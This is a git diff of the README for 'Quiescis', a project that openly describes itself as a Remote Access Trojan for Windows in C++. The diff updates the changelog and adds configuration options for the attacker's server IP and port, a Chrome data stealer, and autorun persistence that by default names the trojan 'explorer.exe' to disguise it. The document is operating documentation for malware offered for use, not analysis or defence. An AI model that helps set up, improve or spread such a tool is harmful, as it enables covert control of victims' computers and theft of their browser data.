@@ -1,10 +1,10 @@
-# Quiescis 1.2.6
+# Quiescis 1.3.0
 
 <b>Quescis</b> is a powerful Remote Access Trojan for windows computer on C++
 
-## Update 1.2.6
-     1. Added to chrome_st the information about downloaded files and search requests
-     2. Bugs fixed in Server.cpp
+## Update 1.3.0
+     1. Improved Config.h
+     2. Many improvements and optimizations
 
 ![alt text](img/header.png)
 
@@ -15,6 +15,14 @@
     - Server Questions cross platform
       you can run it on linux distributions
       and windows
+
+### Config settings
+   - PORT - port of ip (default 4001)
+   - IP    - white ip of server (default 127.0.0.1)
+   - chrome_stealer - 1 (on), also connect sqlite3.h and sqlite3.cpp files to your project in Visual Studio
+   - autorun - 1 (on), add rat to startup
+   - autorun_name - file name at startup (default: "explorer.exe")
+
 
 ### <b>Linux distributions</b>:<br/>
    - cd server/server
